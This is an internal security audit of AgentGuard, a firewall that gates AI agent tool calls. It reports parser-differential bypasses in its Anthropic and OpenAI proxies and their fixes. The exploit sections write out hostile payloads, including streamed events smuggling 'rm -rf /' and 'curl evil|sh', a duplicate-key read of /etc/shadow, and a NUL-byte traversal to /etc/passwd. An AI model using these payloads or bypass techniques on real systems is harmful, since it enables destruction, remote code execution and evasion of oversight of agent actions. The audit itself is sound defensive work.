# AgentGuard Internal Security Audit — 2026-06

> **Resolution status (as of v0.9.0, 2026-07):** this document is the
> point-in-time Phase-0 record; the statuses in the summary table below are
> what was *planned* at audit time, not what is open today. Since then:
> **H1, H2** fixed (`6c87334`, Anthropic streaming gating bypasses — now
> refused fail-closed, counted by `agentguard_llmproxy_protocol_violation_total`);
> **H3, M1** fixed (`51e7b76`, duplicate-key and first-wins tool-name
> differentials); **M3** fixed (control-byte stripping wired into
> `normalizeRequest`); **L4** closed in v0.9 by truth-up (append-only claim +
> WORM forwarding guidance — see `CHANGELOG.md` § 0.9.0); **M2** fixed
> post-v0.9.0 (`pkg/store/sqlite.go` now creates the DB 0600 and tightens
> pre-existing files/sidecars on every open, with Unix-gated regression
> tests). **M4** (redactor coverage of `path`/`domain`/`action` fields) is
> **still open** as of v0.9.0. L1/L2/L3/L5 stand as documented/accepted
> risks.

**Scope:** wire-level firewall runtime — MCP gateway, LLM API proxy, policy engine,
central proxy server, audit log, persistence store.
**Method:** read-only source review of the eight surfaces enumerated in the v0.6
security-audit brief. No code was changed for this document (Phase 0).
**Commit baseline:** `master` @ `6566dce` (post-v0.6 tenant-isolation merge).
**Auditor:** internal (automated review pass).

Severities: **Critical** (remote, unauthenticated, breaks a core guarantee) ·
**High** (breaks a core guarantee under a realistic precondition) ·
**Medium** (defense-in-depth gap, local or precondition-bound) ·
**Low** (hardening / documented-accepted risk).

The product's single most important guarantee is: **no tool call reaches the
client/executor without the gated view being byte-for-byte what the executor
acts on.** Findings that break that (the *parser-differential* class) are ranked
first, exactly as the brief instructs.

---

## Summary table

| ID | Severity | Surface | Title | Status |
|----|----------|---------|-------|--------|
| H1 | **High** | LLM proxy / streaming | Anthropic interleaved `tool_use` blocks bypass gating | Fix in Phase 1 |
| H2 | **High** | LLM proxy / parser | Anthropic `content_block_start.input` ignored → gate sees `{}` while client executes real args | Fix in Phase 1 |
| H3 | **Medium→High** | LLM proxy + MCP gw / parser | Duplicate-JSON-key differential (gate reads last-wins map, executor may read first-wins) | Fix in Phase 1 |
| M1 | **Medium** | LLM proxy / parser | OpenAI streaming tool-name last-wins vs first-wins client differential | Fix in Phase 1 |
| M2 | **Medium** | SQLite store | `agentguard.db` (+ `-wal`/`-shm`) created world-readable, not 0600 | Fix in Phase 1 |
| M3 | **Medium** | Policy engine | `normalizePath` re-introduces NUL/control bytes after URL-decode | Fix in Phase 1 |
| M4 | **Low→Medium** | Notify | Redactor misses `path`/`domain`/`action` fields → secrets reach webhooks/Slack | Fix in Phase 1 |
| L1 | **Low** | Streaming | Unbounded per-event/cumulative buffer when `--max-buffer-bytes=0` | TODO / document |
| L2 | **Low** | Server/network | SSRF via operator-supplied notify webhook URLs | Accepted risk — documented |
| L3 | **Low** | Policy engine | Glob matchers are O(n·m) backtracking (not exponential); patterns operator-trusted | Note only |
| L4 | **Low** | Audit | "tamper-evident" claim unbacked by code (no hash chain) | **v0.9: truth-up + WORM** |
| L5 | **Low** | Server | Approval IDs (capability tokens) appear in request-path access logs | Note / document |
| P1 | *positive* | Audit | No log injection — every field serialized via `encoding/json` | Verified clean |
| P2 | *positive* | Stores | All SQL parameterized — no injection | Verified clean |
| P3 | *positive* | Auth/tenant | Cross-tenant approval/audit isolation holds adversarially | Verified |

---

## H1 — Anthropic interleaved `tool_use` blocks bypass gating (High)

**Files:** [pkg/llmproxy/anthropic_parser.go:224-264](../../pkg/llmproxy/anthropic_parser.go#L224-L264),
[pkg/llmproxy/streaming.go:628-677](../../pkg/llmproxy/streaming.go#L628-L677)

**Class:** parser-differential / gating bypass.

### Mechanism
`AnthropicAccumulator` tracks exactly one *active* tool_use index
(`activeToolUseIndex`, set to the **first** tool_use's index and never advanced
while busy). `FeedEvent` buffers everything from that first
`content_block_start` until **that index's** `content_block_stop`. On that stop
it gates **only** the active block (`assembleCompletedCalls` reads
`a.blocks[a.activeToolUseIndex]` only — anthropic_parser.go:283-287).

The orchestrator then, on ALLOW, flushes **all** buffered bytes to the client and
calls `acc.Reset()` (streaming.go:675), which wipes `blocks` and resets
`activeToolUseIndex = -1`.

### Exploit (adversarial / non-conformant upstream)
A stream that opens a second tool_use block *before* closing the first:

```
content_block_start  index=0  tool_use  name="read_file"        ← active=0, buffered
content_block_delta  index=0  input_json_delta {"path":"/ok"}   ← buffered, accumulated
content_block_start  index=1  tool_use  name="bash"             ← buffered, blocks[1] made, active STAYS 0
content_block_delta  index=1  input_json_delta {"cmd":"rm -rf /"}← buffered, NOT accumulated (idx!=active)
content_block_stop   index=0                                     ← Completed: gates ONLY block 0 (read_file)
        → ALLOW → flush ALL buffered bytes (incl. block 1 start+delta) → Reset()
content_block_delta  index=1  input_json_delta {...}            ← idle → PassThrough (ungated)
content_block_stop   index=1                                    ← idle → PassThrough (ungated)
```

Block 1 (`bash {"cmd":"rm -rf /"}`) is delivered to the client **fully ungated**.
The non-streaming path does **not** have this bug — `gateAnthropicNonStreaming`
([forward.go:352-383](../../pkg/llmproxy/forward.go#L352-L383)) walks **every**
`tool_use` block in `content[]`. So the two transports disagree, which is itself
the differential the product is meant to prevent.

### Precondition / realism
Benign Anthropic traffic emits content blocks **serially** (block N's stop before
block N+1's start), so this never fires for conformant upstreams. It requires a
non-conformant or malicious upstream (self-hosted / proxied "Anthropic-compatible"
endpoint, MITM, or compromised gateway) — explicitly in scope per the brief
("unexpected SSE event ordering … designed to make the gated view differ").

### Proposed fix
Treat the *opening of any second tool_use block while one is already active* as a
condition that forces gating/closure of the active block first, OR (simpler and
fail-closed) refuse to flush+Reset while any non-active, unclosed tool_use block
remains buffered — emit the buffer-overflow-style synthetic refusal instead. The
fix must keep the ALLOW-path byte-identity invariant for the common serial case.
Regression test: interleaved two-block stream must end with the second block
gated (DENY when policy denies `bash`), and the serial two-block stream must stay
byte-identical on ALLOW.

---

## H2 — Anthropic `content_block_start.input` is ignored (High)

**File:** [pkg/llmproxy/anthropic_parser.go:162-181](../../pkg/llmproxy/anthropic_parser.go#L162-L181),
[anthropic_parser.go:283-308](../../pkg/llmproxy/anthropic_parser.go#L283-L308)

**Class:** parser-differential.

### Mechanism
On `content_block_start` for a tool_use, the parser records `id`/`name` but
**discards** `content_block.input` ("Spec: initial input is `{}` placeholder. We
ignore it"). Arguments are taken **only** from accumulated `input_json_delta`
fragments. If a stream delivers the real arguments in the `start` event's `input`
field and emits **no** (or only benign) `input_json_delta`, the gate sees
`InputJSON == ""` → `args = "{}"` (anthropic_parser.go:288-293) and evaluates an
**empty** tool call.

But the raw `content_block_start` bytes (containing `input:{…real…}`) are replayed
byte-identically on ALLOW, and the Anthropic SDK's streaming accumulator seeds
tool input from the `start` block and only overwrites it if `input_json_delta`
fragments arrive. Net: **gate sees `{}` (benign → ALLOW), client executes the real
arguments.**

### Exploit
```
content_block_start index=0 tool_use name="bash" input={"command":"curl evil|sh"}
content_block_stop  index=0
```
Gate evaluates `bash {}` (likely benign / no path/url/command projected) → ALLOW;
client SDK runs `bash curl evil|sh`.

### Proposed fix
When `content_block_start` for a tool_use carries a non-empty `input`, seed the
block's `InputJSON` with it (and let later `input_json_delta` fragments append, or
treat their presence as a conflict → fail closed). Add it to the overflow byte
accounting. Regression test: a start-only tool_use with dangerous `input` must be
gated on those arguments.

---

## H3 — Duplicate-JSON-key differential (Medium, escalates to High vs first-wins executors)

**Files:** [pkg/llmproxy/gate.go:227-281](../../pkg/llmproxy/gate.go#L227-L281)
(`projectPath`/`projectURL`/`formatLLMCommand` read `req.Arguments` — a Go
`map[string]interface{}`), [pkg/mcpgw/gate.go:232-308](../../pkg/mcpgw/gate.go#L232-L308),
[pkg/llmproxy/openai_parser.go:294-299](../../pkg/llmproxy/openai_parser.go#L294-L299),
[pkg/llmproxy/forward.go:324-348](../../pkg/llmproxy/forward.go#L324-L348).

**Class:** parser-differential.

### Mechanism
Tool-call arguments are parsed with `json.Unmarshal` into
`map[string]interface{}`. Go's decoder keeps the **last** value for duplicate
keys. The gate projects `path`/`url`/`domain`/`command` from that map. The raw
argument bytes are replayed verbatim to the client. If the downstream tool
executor's JSON parser resolves duplicate keys **first-wins** (some
language/library combinations do), the executed value differs from the gated one.

### Exploit (against a first-wins executor)
```json
{"path":"/etc/shadow","path":"/tmp/ok"}
```
Go map → `path="/tmp/ok"` → ALLOW. First-wins executor → opens `/etc/shadow`.

### Precondition
Most mainstream JSON parsers (Go, JS `JSON.parse`, Python `json`) are last-wins —
so against those there is no differential. Risk is real only when the executor is
first-wins, but the product's job is precisely to remove such ambiguity.

### Proposed fix
Reject tool-call argument objects containing duplicate keys (detect with a
streaming `json.Decoder` token scan over `RawArguments`), failing closed (DENY)
on duplicates. Shared helper usable by both proxies. Regression test:
duplicate-key arguments → DENY.

---

## M1 — OpenAI streaming tool-name last-wins differential (Medium)

**File:** [pkg/llmproxy/openai_parser.go:246-249](../../pkg/llmproxy/openai_parser.go#L246-L249)

`if tc.Function.Name != "" { st.Name = tc.Function.Name }` — the accumulator takes
the **last** non-empty function name across fragments for a given
`tool_calls[i].index`. The OpenAI wire format sends the name once in the first
fragment; a non-conformant upstream that sends `name` twice (e.g.
`name="read_file"` then `name="bash"`) makes the gate evaluate the *last* name
while a first-wins client SDK executes the *first*. Whichever order the client
uses, an attacker can pick the opposite for the gate.

**Fix:** make name assignment first-wins (ignore later non-empty names, or treat a
second distinct name as a conflict → fail closed). Cheap, no byte-identity impact
(raw bytes still replay). Regression test: two-name fragment stream gates the same
name the spec-conformant client would act on.

---

## M2 — SQLite store files not mode 0600 (Medium)

**Files:** [pkg/store/sqlite.go:34-63](../../pkg/store/sqlite.go#L34-L63),
`pkg/audit/sqlite_logger.go:104-135` (prototype since removed from the tree),
[cmd/agentguard/main.go:282-296](../../cmd/agentguard/main.go#L282-L296).

`NewSQLiteStore`/`NewSQLiteLogger` call `sql.Open("sqlite", path)`, which creates
`agentguard.db` (and the `-wal`/`-shm` sidecars) using the process umask —
typically **0644** on Unix. These files hold the full audit trail (commands,
paths, domains, agent IDs) plus approval/cost/bucket state. The brief explicitly
requires 0600. The JSONL `FileLogger` already does this correctly
([logger.go:139,174](../../pkg/audit/logger.go#L139)); the SQLite paths do not.

**Exploit:** any local user on a shared host reads the audit DB and reconstructs
every gated action.

**Fix:** create the DB file with 0600 before/at open (e.g. pre-create with
`os.OpenFile(path, O_CREATE, 0600)` then `os.Chmod`, and `chmod` the `-wal`/`-shm`
siblings after WAL is enabled). Skip for `:memory:`/DSN-less ephemeral. Regression
test (Unix-gated): `stat` the created files, assert mode `0600`.

---

## M3 — `normalizePath` re-introduces control/NUL bytes after URL-decode (Medium)

**File:** [pkg/policy/engine.go:1480-1521](../../pkg/policy/engine.go#L1480-L1521)

`normalizePath` runs `stripControl(p)` **then** `urlUnescape(p)`. So `%00`, `%0a`,
`%1b` survive the strip (they are literal `%`+hex at strip time) and are decoded
into real NUL/newline/escape bytes **after** stripping, with no second strip. The
decoded control byte then flows into `filepath.Clean`/`globMatch` and into the
audit `path` field. While the JSON audit encoder escapes newlines (no log
injection — see P1), a decoded NUL can create a path-matching differential
(`/workspace/ok.txt%00/../../etc/passwd` style) and defeats the stated null-byte
defense in `stripControl`'s own doc comment.

**Fix:** re-run `stripControl` **after** `urlUnescape`. One-line change; add a test
that `path=/x%00/../etc` is sanitized before matching.

---

## M4 — Notify redactor misses `path`/`domain`/`action` (Low→Medium)

**File:** [pkg/notify/notify.go:484-496](../../pkg/notify/notify.go#L484-L496)

`Redactor.Redact` scrubs `Request.Command`, `Request.URL`, `Result.Reason`, and
`Request.Meta` — but **not** `Request.Path`, `Request.Domain`, or
`Request.Action`. `WebhookNotifier.Notify` posts the **full** `json.Marshal(event)`
(notify.go:277), so a secret carried in a `path` (e.g. a pre-signed URL written as
a filesystem target) or `domain` reaches an external webhook/Slack unredacted. The
Slack/Console/Log notifiers also fall back to `Request.Path`/`Domain` as the
display action (notify.go:333-339, 393-399).

**Fix:** extend `Redact` to also scrub `Path`, `Domain`, and `Action`. Add a test
with a tokenized path asserting `[REDACTED]` in the webhook body.

---

## L1 — Unbounded streaming buffer when `--max-buffer-bytes=0` (Low)

**File:** [pkg/llmproxy/streaming.go:155-177](../../pkg/llmproxy/streaming.go#L155-L177),
[streaming.go:406](../../pkg/llmproxy/streaming.go#L406)

`readSSEEvent` is called with `maxEventBytes = s.cfg.MaxBufferBytes*2`; when an
operator sets `--max-buffer-bytes=0` ("no cap", used in tests), both the
per-event read and the accumulator's cumulative cap are disabled, so an upstream
that never sends a blank-line terminator grows `buf` unbounded → memory DoS.
Production default is non-zero, so this is operator-self-inflicted.

**Fix / mitigation:** document that `0` disables the safety cap and is
non-production; optionally enforce a hard absolute ceiling regardless. Logged as a
TODO in this doc; not a Phase-1 blocker.

---

## L2 — SSRF via operator notify webhooks (Low, accepted)

**File:** [pkg/notify/notify.go:192-209,266-303](../../pkg/notify/notify.go#L192-L209)

Webhook/Slack target URLs come **only** from policy YAML
(`notifications.*.url`) — operator-supplied, loaded at policy-load time. No
request-time, agent-controlled input reaches URL construction. This is a standard
operator-trust boundary; AgentGuard will POST event JSON to whatever URL the
operator configured (including internal addresses). **Verified: no request-time
input path into the URL.** Documented as accepted risk; SECURITY.md should state
that webhook URLs are trusted operator config.

---

## L3 — Glob matcher complexity (Low, note only)

**File:** [pkg/policy/engine.go:1660-1720](../../pkg/policy/engine.go#L1660-L1720)

`wildcardMatch` and `matchSegments` use the classic single-backtrack-pointer
greedy algorithm — **O(n·m)** worst case, **not** exponential catastrophic
backtracking. Patterns are operator-authored (trusted); the matched *value*
(command/path) is bounded by the 1 MiB request-body cap. No pathological DoS from
adversarial input against a benign pattern. No fix required; noted for
completeness.

---

## L4 — "tamper-evident" audit claim is unbacked (Low → addressed in v0.9 by truth-up)

**Files:** README "tamper-evident" claim; [pkg/audit/checkpoint.go](../../pkg/audit/checkpoint.go)
(replay-offset only — no hash chain).

The README markets the audit log as "tamper-evident," but the code has no
integrity chain: an attacker with write access to the JSONL/SQLite store can edit
or delete entries undetectably (`checkpoint.go` is a byte-offset for replay, not a
MAC). This is a truth-in-advertising gap.

**Resolved in v0.9 by truth-up, not by crypto.** The original plan was a SHA-256
`prev_hash`/`entry_hash` chain (or batched Merkle checkpoints) plus an `audit
verify` CLI. That was evaluated and **deferred out of the v0.9 core scope**:
tamper-evidence is better delivered by forwarding the append-only JSONL log to
external WORM storage (S3 Object Lock, a SIEM, or syslog), which the product does
not need to re-implement. v0.9 instead corrects the wording — the README and FAQ
now describe an **append-only** audit log and point operators at WORM forwarding
for tamper-evidence. See [`../COMPATIBILITY.md`](../COMPATIBILITY.md) for the
frozen audit `schema_version: 2` surface. In-process cryptographic sealing remains
a candidate for a post-v1 release only if a concrete requirement arises.

---

## L5 — Approval IDs (capability tokens) logged in request path (Low)

**Files:** [pkg/proxy/server.go:1593-1599](../../pkg/proxy/server.go#L1593-L1599)
(`withLogging` logs `r.URL.Path`); legacy routes `/v1/approve/{id}`,
`/v1/status/{id}`.

Approval IDs are 16-byte random capability tokens; on the legacy URL family they
sit in the path and are echoed into the process access log
(`log.Printf("%s %s %v", method, path, dur)`). Resolving/approving still requires
auth, so this is not directly exploitable, but capability material in logs is a
defense-in-depth smell. **Mitigation:** acceptable for local logs; note in
OPERATIONS.md that audit/access logs may contain approval IDs and should inherit
the same 0600 handling.

---

## Positive findings (verified clean)

- **P1 — No audit log injection.** Both `FileLogger.Log`
  ([logger.go:208-228](../../pkg/audit/logger.go#L208)) and `SQLiteLogger.Log`
  serialize every field through `encoding/json` / parameterized SQL. A `\n` or
  `{`-laden agent ID / command cannot forge or split a JSONL record — newlines are
  `\n`-escaped inside the single-line JSON object. Verified across `agent_id`,
  `command`, `reason`, `rule`.
- **P2 — No SQL injection.** Every query in
  [pkg/store/sqlite.go](../../pkg/store/sqlite.go) and
  `pkg/audit/sqlite_logger.go` (prototype since removed) uses `?`
  placeholders; the only string concatenation builds **static** column-name
  predicates (`"agent_id = ?"`), never user data. `LIMIT`/`OFFSET` are
  parameterized.
- **P3 — Cross-tenant isolation holds.** `ApprovalQueue.Lookup`/`Resolve`/`List`
  and `handleStatus` all compare via `tenantsMatch` and return *not found* on
  mismatch (server.go:1303-1316, 1388-1397, 1259-1276), so a tenant cannot read,
  resolve, or even probe the existence of another tenant's approvals. Audit query
  is tenant-scoped (server.go:997-1006 + sqlite.go:414-428). The
  `/v1/check` approval-id replay is bound to the original action via
  `matchesOriginalRequest` and falls through (no oracle) on mismatch. Verified
  adversarially by tracing every approval/audit code path.
- **Server hardening present:** central server sets
  `ReadHeaderTimeout`/`ReadTimeout`/`WriteTimeout`/`IdleTimeout`
  (server.go:421-424); `/v1/check` body is capped by `MaxBytesReader`
  (server.go:508-509); panics are recovered (server.go:1619-1633); session store
  is bounded and fails closed at capacity; CSRF is double-submit with
  `SameSite=Strict`; CORS is exact-match or localhost-only. The LLM proxy sets
  `ReadHeaderTimeout` and intentionally omits `WriteTimeout` for streaming
  (correct), and bounds request bodies via `--max-buffer-bytes`.

---

## Phase 1 fix plan (this milestone)

Fix all High + the cheap Mediums, each with a fail-before/pass-after regression
test:

1. **H1** interleaved tool_use → fail-closed refusal (anthropic_parser + streaming).
2. **H2** seed tool input from `content_block_start.input`.
3. **H3** duplicate-key rejection (shared helper, both proxies + non-streaming).
4. **M1** first-wins tool name.
5. **M2** 0600 on SQLite DB + sidecars.
6. **M3** re-strip control bytes after URL-decode.
7. **M4** redact `path`/`domain`/`action`.

**L1** documented; **L2/L3/L5** documented/accepted; **L4** delivered by Phase 2.
